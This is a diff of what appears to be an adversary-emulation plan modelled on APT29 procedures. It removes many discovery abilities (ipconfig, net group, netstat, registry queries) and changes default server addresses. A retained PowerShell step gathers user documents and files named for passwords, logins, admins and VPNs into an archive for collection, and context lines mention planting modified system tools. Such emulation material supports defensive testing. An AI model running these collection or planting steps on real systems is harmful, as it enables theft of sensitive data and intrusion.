@@ -45,7 +45,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -115,48 +115,6 @@
   - name: powershell
     command: |
       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
-
-- id: ee08a427-1e1d-4d8a-aeb1-978a7fcf9087
-  name: System Network Configuration Discovery
-  description: The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.
-  tactic: discovery
-  technique:
-    attack_id: T1016
-    name: "System Network Configuration Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.A.2"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          ipconfig /all
-
-  executors:
-  - name: command_prompt
-    command: |
-      ipconfig /all
-
-- id: 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce
-  name: System Network Configuration Discovery
-  description: The arp utility is executed via cmd to enumerate local ARP configuration information.
-  tactic: discovery
-  technique:
-    attack_id: T1016
-    name: "System Network Configuration Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.A.3"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          arp -a
-
-  executors:
-  - name: command_prompt
-    command: |
-      arp -a
 
 - id: 35d95b64-c1f8-4ac7-a2f2-8959218239cd
   name: System Owner / User Discovery
@@ -240,174 +198,6 @@
       Import-Module .\ps.ps1 -Verbose -Force;
       ProcessList
 
-- id: 41610306-087c-4c34-874b-37b8ed633a36
-  name: Process Discovery
-  description: The tasklist utility is executed via cmd to enumerate local running processes.
-  tactic: discovery
-  technique:
-    attack_id: T1057
-    name: "Process Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.C.2"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          tasklist /v
-
-  executors:
-  - name: command_prompt
-    command: |
-      tasklist /v
-
-- id: 2ff877b4-0c00-401e-9d3f-070c70b610df
-  name: System Service Discovery
-  description: The sc utility is executed via cmd to enumerate local active services.
-  tactic: discovery
-  technique:
-    attack_id: T1007
-    name: "System Service Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.D.1"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          sc query
-
-  executors:
-  - name: command_prompt
-    command: |
-      sc query
-
-- id: 144b1384-5060-494f-80eb-91772695cdf3
-  name: System Service Discovery
-  description: The net utility is executed via cmd to enumerate local active services.
-  tactic: discovery
-  technique:
-    attack_id: T1007
-    name: "System Service Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.D.2"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          net start
-
-  executors:
-  - name: command_prompt
-    command: |
-      net start
-
-- id: d2ea2676-7f85-4228-b980-ab3c0e1adc03
-  name: System Information Discovery
-  description: The systeminfo utility is executed via cmd to enumerate local operating system configuration.
-  tactic: discovery
-  technique:
-    attack_id: T1082
-    name: "System Information Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.E.1"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          systeminfo
-
-  executors:
-  - name: command_prompt
-    command: |
-      systeminfo
-
-- id: 7c2a6e5b-1adb-464f-a581-4677391f8dd6
-  name: System Information Discovery
-  description: The net utility is executed via cmd to enumerate local operating system configuration.
-  tactic: discovery
-  technique:
-    attack_id: T1082
-    name: "System Information Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.E.2"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          net config workstation
-
-  executors:
-  - name: command_prompt
-    command: |
-      net config workstation
-
-- id: faa96e7f-081a-40b7-a743-a6a7f2627ea3
-  name: Permissions Groups Discovery
-  description: The net utility is executed via cmd to enumerate members of the local system's administrators group.
-  tactic: discovery
-  technique:
-    attack_id: T1069
-    name: "Permission Groups Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.F.1"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          net localgroup administrators
-
-  executors:
-  - name: command_prompt
-    command: |
-      net localgroup administrators
-
-- id: 26181249-be75-41ed-9fe7-5c30ea8c2d4d
-  name: Permissions Groups Discovery
-  description: The net utility is executed via cmd to enumerate members of the domain controller’s administrators group.
-  tactic: discovery
-  technique:
-    attack_id: T1069
-    name: "Permission Groups Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.F.2"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          net localgroup administrators /domain
-
-  executors:
-  - name: command_prompt
-    command: |
-      net localgroup administrators /domain
-
-- id: 84377d7a-0363-44fd-a082-44657ca1858f
-  name: Permissions Groups Discovery
-  description: The net utility is executed via cmd to enumerate members of the domain administrators group.
-  tactic: discovery
-  technique:
-    attack_id: T1069
-    name: "Permission Groups Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.F.3"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          cmd.exe /c net group "Domain Admins" /domain
-
-  executors:
-  - name: powershell
-    command: |
-      cmd.exe /c net group "Domain Admins" /domain
-
 - id: 61221fb9-cb32-46d5-98fd-90567a621526
   name: Account Discovery
   description: The net utility is executed via cmd to enumerate domain user accounts.
@@ -449,27 +239,6 @@
   - name: command_prompt
     command: |
       net user %USERNAME% /domain
-
-- id: 5c23f638-9cfc-4fc4-9cab-4af628fef70a
-  name: Query Registry
-  description: The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.
-  tactic: discovery
-  technique:
-    attack_id: T1012
-    name: "Query Registry"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "2.H.1"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
-
-  executors:
-  - name: command_prompt
-    command: |
-      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 
 # Step 3 - Deploy Stealth Toolkit
 - id: 68b588bc-002a-42dc-bac7-9189f944065b
@@ -551,7 +320,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -673,7 +442,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -813,92 +582,6 @@
         write-host "[!] Error downloading and planting modified system tools."
       }
 
-- id: 59592c35-8207-4896-8d8b-36ad4600245d
-  name: Remote System Discovery
-  description: The net utility is executed via cmd to enumerate DCs within the domain
-  tactic: discovery
-  technique:
-    attack_id: T1018
-    name: "Remote System Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "4.A.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          cmd.exe /c net group "Domain Controllers" /domain
-
-  executors:
-  - name: powershell
-    command: |
-      cmd.exe /c net group "Domain Controllers" /domain
-
-- id: 24ed020e-4730-4000-b6b4-6b5d3e95314f
-  name: Remote System Discovery
-  description: The net utility is executed via cmd to enumerate hosts within the domain.
-  tactic: discovery
-  technique:
-    attack_id: T1018
-    name: "Remote System Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "4.A.3"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          cmd.exe /c net group "Domain Computers" /domain
-
-  executors:
-  - name: powershell
-    command: |
-      cmd.exe /c net group "Domain Computers" /domain
-
-- id: 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b
-  name: System Network Configuration Discovery
-  description: The netsh utility is executed via cmd to enumerate local firewall configuration information.
-  tactic: discovery
-  technique:
-    attack_id: T1016
-    name: "System Network Configuration Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "4.B.1"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          netsh advfirewall show allprofiles
-
-  executors:
-  - name: command_prompt
-    command: |
-      netsh advfirewall show allprofiles
-
-- id: 646be6c9-f27a-4f5f-be5d-b8a0317e215f
-  name: Process Discovery
-  description: List running process on the machine via PowerShell.
-  tactic: discovery
-  technique:
-    attack_id: T1057
-    name: "Process Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "4.B.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          $ps = get-process;
-          write-output $ps;
-
-  executors:
-  - name: powershell
-    command: |
-      $ps = get-process;
-      write-output $ps;
-
 - id: 9b5b5aec-32ff-4d74-8555-727b50ab15f6
   name: Artifact Cleanup - Delete Files
   description: Cleanup files related to Operation
@@ -976,27 +659,6 @@
       }
       . .\readme.ps1;
       Invoke-Discovery;
-
-- id: ba0b398d-91b8-490a-bed2-f959afa8e1aa
-  name: 4.C.2 - System Network Connections Discovery (T1049)
-  description: The netstat utility is executed via cmd to enumerate local active network connections.
-  tactic: discovery
-  technique:
-    attack_id: T1049
-    name: "System Network Connections Discovery"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_discovery
-  procedure_step: "4.C.2"
-  platforms:
-    windows:
-      cmd:
-        command: |
-          netstat -ano
-
-  executors:
-  - name: command_prompt
-    command: |
-      netstat -ano
 
 # Step 5 - Persistence
 
@@ -1156,7 +818,7 @@
     remote.file.share:
       description: IP or Hostname of remote file share
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
     server:
       description: IP or Hostname of server
@@ -1238,12 +900,12 @@
     remote.file.share:
       description: IP or Hostname of remote file share
       type: string
-      default: 192.0.2.20
+      default: 10.0.17.4
 
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -1536,12 +1198,12 @@
     remote.file.share:
       description: IP or Hostname of remote file share
       type: string
-      default: 192.0.2.20
+      default: 10.0.17.4
 
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -1583,12 +1245,12 @@
     remote.file.share:
       description: IP or Hostname of remote file share
       type: string
-      default: 192.0.2.20
+      default: 10.0.17.4
 
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -1688,12 +1350,12 @@
     remote.file.share:
       description: IP or Hostname of remote file share
       type: string
-      default: 192.0.2.20
+      default: 10.0.17.4
 
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -1731,7 +1393,7 @@
     pivot_machine_hostname:
       description: Hostname of pivot machine
       type: string
-      default: pivothost
+      default: DESKTOP-1EA6OI1
 
     user.session.id:
       description: Session id for user
@@ -1741,7 +1403,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
@@ -1794,7 +1456,7 @@
     remote.file.share:
       description: IP or Hostname of remote file share
       type: string
-      default: 192.0.2.20
+      default: 10.0.17.4
 
   executors:
   - name: powershell
@@ -1860,7 +1522,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 10.0.17.3
 
   executors:
   - name: powershell
